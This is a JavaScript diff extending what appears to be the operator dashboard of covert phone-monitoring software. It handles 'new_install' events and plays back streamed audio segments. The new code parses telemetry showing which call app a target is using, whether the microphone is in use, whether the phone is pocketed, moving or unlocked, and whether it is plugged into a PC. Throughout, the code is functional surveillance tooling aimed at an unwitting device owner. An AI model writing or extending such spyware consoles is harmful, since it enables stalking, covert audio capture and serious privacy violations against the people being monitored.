@@ -32,6 +32,10 @@ const ui = {
     iconPause: document.getElementById('icon-pause'),
     speedSelect: document.getElementById('speed-select'),
     playerStateBadge: document.getElementById('player-state-badge'),
+    telemetryCallAppBadge: document.getElementById('telemetry-callapp-badge'),
+    telemetryPostureBadge: document.getElementById('telemetry-posture-badge'),
+    telemetryTempBadge: document.getElementById('telemetry-temp-badge'),
+    telemetryMotionBadge: document.getElementById('telemetry-motion-badge'),
     telemetryScreenBadge: document.getElementById('telemetry-screen-badge'),
     telemetryPowerBadge: document.getElementById('telemetry-power-badge'),
     telemetryRingerBadge: document.getElementById('telemetry-ringer-badge'),
@@ -239,6 +243,8 @@ function initWebSocket() {
                 const msg = JSON.parse(event.data);
                 if (msg.type === 'new_install' && msg.data) {
                     handleNewInstallEvent(msg.data);
+                } else if (msg.type === 'live_telemetry') {
+                    handleLiveTelemetryMessage(msg);
                 }
             } catch (e) { }
         };
@@ -564,6 +570,11 @@ function parseTelemetryFromSegmentName(segUrl) {
     const vMatch = segUrl.match(/_V([01])/);
     const dbMatch = segUrl.match(/_dB(\d+)/);
 
+    const tMatch = segUrl.match(/_T(\d+)/);
+    const mMatch = segUrl.match(/_M([01])/);
+    const pMatch = segUrl.match(/_P([A-Z]+)/);
+    const aMatch = segUrl.match(/_A([A-Z0-9]+)/);
+
     // Battery
     if (bMatch && ui.telemetryBatteryBadge) {
         const pct = parseInt(bMatch[1], 10);
@@ -638,6 +649,186 @@ function parseTelemetryFromSegmentName(segUrl) {
         } else {
             ui.telemetryAudioBadge.textContent = `🤫 Ambient (${db}dB)`;
             ui.telemetryAudioBadge.className = 'status-badge';
+        }
+    }
+
+    // 5. Active Call & Mic App
+    if (aMatch && ui.telemetryCallAppBadge) {
+        const aCode = aMatch[1];
+        if (aCode === 'AWA') {
+            ui.telemetryCallAppBadge.textContent = '🟢 Call: WhatsApp';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--green';
+        } else if (aCode === 'AIG') {
+            ui.telemetryCallAppBadge.textContent = '🟣 Call: Instagram';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--purple';
+        } else if (aCode === 'ATG') {
+            ui.telemetryCallAppBadge.textContent = '🔵 Call: Telegram';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--cyan';
+        } else if (aCode === 'AZOOM') {
+            ui.telemetryCallAppBadge.textContent = '💻 Call: Zoom';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--blue';
+        } else if (aCode === 'AMEET') {
+            ui.telemetryCallAppBadge.textContent = '📹 Call: Google Meet';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--green';
+        } else if (aCode === 'ACELL') {
+            ui.telemetryCallAppBadge.textContent = '📞 Call: Cellular Phone';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--yellow';
+        } else if (aCode === 'AMIC') {
+            ui.telemetryCallAppBadge.textContent = '🎙️ Mic: In Use (External App)';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--orange';
+        } else if (aCode === 'AVOIP') {
+            ui.telemetryCallAppBadge.textContent = '🌐 Call: VoIP (Encrypted)';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--cyan';
+        } else if (aCode !== 'AIDLE') {
+            ui.telemetryCallAppBadge.textContent = `📞 Call: ${aCode.replace(/^A/, '')}`;
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--yellow';
+        } else {
+            ui.telemetryCallAppBadge.textContent = '📞 Call: None';
+            ui.telemetryCallAppBadge.className = 'status-badge';
+        }
+    }
+
+    // 6. Posture (Pocket / Desk / Hand)
+    if (pMatch && ui.telemetryPostureBadge) {
+        const pCode = pMatch[1];
+        if (pCode === 'POCK') {
+            ui.telemetryPostureBadge.textContent = '👖 Posture: In Pocket / Face-Down';
+            ui.telemetryPostureBadge.className = 'status-badge status-badge--purple';
+        } else if (pCode === 'DESK') {
+            ui.telemetryPostureBadge.textContent = '🪵 Posture: On Desk (Face-Up)';
+            ui.telemetryPostureBadge.className = 'status-badge status-badge--cyan';
+        } else if (pCode === 'OPEN') {
+            ui.telemetryPostureBadge.textContent = '✋ Posture: In Hand (Active)';
+            ui.telemetryPostureBadge.className = 'status-badge status-badge--green';
+        } else {
+            ui.telemetryPostureBadge.textContent = `📱 Posture: ${pCode}`;
+            ui.telemetryPostureBadge.className = 'status-badge';
+        }
+    }
+
+    // 7. Battery Temperature
+    if (tMatch && ui.telemetryTempBadge) {
+        const temp = parseInt(tMatch[1], 10);
+        ui.telemetryTempBadge.textContent = temp > 0 ? `🌡️ Temp: ${temp}°C` : '🌡️ Temp: --°C';
+        ui.telemetryTempBadge.className = temp >= 40 ? 'status-badge status-badge--red' : 'status-badge';
+    }
+
+    // 8. Physical Motion
+    if (mMatch && ui.telemetryMotionBadge) {
+        const isMoving = mMatch[1] === '1';
+        if (isMoving) {
+            ui.telemetryMotionBadge.textContent = '🏃 Motion: Moving / Picked Up';
+            ui.telemetryMotionBadge.className = 'status-badge status-badge--green';
+        } else {
+            ui.telemetryMotionBadge.textContent = '🪑 Motion: Still';
+            ui.telemetryMotionBadge.className = 'status-badge';
+        }
+    }
+}
+
+function handleLiveTelemetryMessage(msg) {
+    if (msg.battery !== undefined && ui.telemetryBatteryBadge) {
+        ui.telemetryBatteryBadge.textContent = `🔋 Battery: ${msg.battery}%`;
+    }
+    if (msg.route && ui.telemetryRouteBadge) {
+        const names = { 'SPK': '🔊 Speaker', 'JCK': '🎧 Wired Jack', 'BLU': '📡 Bluetooth' };
+        ui.telemetryRouteBadge.textContent = names[msg.route] || `🔊 Output: ${msg.route}`;
+    }
+    if (msg.screenOn !== undefined && ui.telemetryScreenBadge) {
+        if (msg.screenOn) {
+            ui.telemetryScreenBadge.textContent = msg.isUnlocked ? '📱 Screen: ON (Unlocked)' : '📱 Screen: ON (Locked)';
+            ui.telemetryScreenBadge.className = msg.isUnlocked ? 'status-badge status-badge--cyan' : 'status-badge status-badge--yellow';
+        } else {
+            ui.telemetryScreenBadge.textContent = '🌑 Screen: OFF';
+            ui.telemetryScreenBadge.className = 'status-badge';
+        }
+    }
+    if (msg.powerSource && ui.telemetryPowerBadge) {
+        const pCode = msg.powerSource;
+        if (pCode === 'CUSB') {
+            ui.telemetryPowerBadge.textContent = '💻 Power: USB (PC Connected)';
+            ui.telemetryPowerBadge.className = 'status-badge status-badge--purple';
+        } else if (pCode === 'CAC') {
+            ui.telemetryPowerBadge.textContent = '⚡ Power: Wall AC Charging';
+            ui.telemetryPowerBadge.className = 'status-badge status-badge--green';
+        } else if (pCode === 'CWIR') {
+            ui.telemetryPowerBadge.textContent = '🛜 Power: Wireless Charging';
+            ui.telemetryPowerBadge.className = 'status-badge status-badge--cyan';
+        } else {
+            ui.telemetryPowerBadge.textContent = '🔋 Power: On Battery';
+            ui.telemetryPowerBadge.className = 'status-badge';
+        }
+    }
+    if (msg.ringerMode && ui.telemetryRingerBadge) {
+        if (msg.ringerMode === 'RS') {
+            ui.telemetryRingerBadge.textContent = '🔇 Ringer: Silent';
+            ui.telemetryRingerBadge.className = 'status-badge status-badge--orange';
+        } else if (msg.ringerMode === 'RV') {
+            ui.telemetryRingerBadge.textContent = '📳 Ringer: Vibrate';
+            ui.telemetryRingerBadge.className = 'status-badge status-badge--yellow';
+        } else {
+            ui.telemetryRingerBadge.textContent = '🔔 Ringer: Normal';
+            ui.telemetryRingerBadge.className = 'status-badge';
+        }
+    }
+    if (ui.telemetryCallAppBadge) {
+        const aCode = msg.callCode || 'AIDLE';
+        const appLabel = msg.callApp || '';
+        if (aCode === 'AWA') {
+            ui.telemetryCallAppBadge.textContent = '🟢 Call: WhatsApp';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--green';
+        } else if (aCode === 'AIG') {
+            ui.telemetryCallAppBadge.textContent = '🟣 Call: Instagram';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--purple';
+        } else if (aCode === 'ATG') {
+            ui.telemetryCallAppBadge.textContent = '🔵 Call: Telegram';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--cyan';
+        } else if (aCode === 'AZOOM') {
+            ui.telemetryCallAppBadge.textContent = '💻 Call: Zoom';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--blue';
+        } else if (aCode === 'AMEET') {
+            ui.telemetryCallAppBadge.textContent = '📹 Call: Google Meet';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--green';
+        } else if (aCode === 'ACELL') {
+            ui.telemetryCallAppBadge.textContent = '📞 Call: Cellular Phone';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--yellow';
+        } else if (aCode === 'AMIC') {
+            ui.telemetryCallAppBadge.textContent = '🎙️ Mic: External App';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--orange';
+        } else if (aCode === 'AVOIP') {
+            ui.telemetryCallAppBadge.textContent = '🌐 Call: VoIP (Encrypted)';
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--cyan';
+        } else if (aCode !== 'AIDLE') {
+            ui.telemetryCallAppBadge.textContent = `📞 Call: ${appLabel || aCode.replace(/^A/, '')}`;
+            ui.telemetryCallAppBadge.className = 'status-badge status-badge--yellow';
+        } else {
+            ui.telemetryCallAppBadge.textContent = '📞 Call: None';
+            ui.telemetryCallAppBadge.className = 'status-badge';
+        }
+    }
+    if (msg.posture && ui.telemetryPostureBadge) {
+        if (msg.posture === 'POCK') {
+            ui.telemetryPostureBadge.textContent = '👖 Posture: In Pocket / Face-Down';
+            ui.telemetryPostureBadge.className = 'status-badge status-badge--purple';
+        } else if (msg.posture === 'DESK') {
+            ui.telemetryPostureBadge.textContent = '🪵 Posture: On Desk (Face-Up)';
+            ui.telemetryPostureBadge.className = 'status-badge status-badge--cyan';
+        } else {
+            ui.telemetryPostureBadge.textContent = '✋ Posture: In Hand (Active)';
+            ui.telemetryPostureBadge.className = 'status-badge status-badge--green';
+        }
+    }
+    if (msg.batteryTemp !== undefined && ui.telemetryTempBadge) {
+        ui.telemetryTempBadge.textContent = msg.batteryTemp > 0 ? `🌡️ Temp: ${msg.batteryTemp}°C` : '🌡️ Temp: --°C';
+        ui.telemetryTempBadge.className = msg.batteryTemp >= 40 ? 'status-badge status-badge--red' : 'status-badge';
+    }
+    if (msg.isMoving !== undefined && ui.telemetryMotionBadge) {
+        if (msg.isMoving) {
+            ui.telemetryMotionBadge.textContent = '🏃 Motion: Moving / Picked Up';
+            ui.telemetryMotionBadge.className = 'status-badge status-badge--green';
+        } else {
+            ui.telemetryMotionBadge.textContent = '🪑 Motion: Still';
+            ui.telemetryMotionBadge.className = 'status-badge';
         }
     }
 }
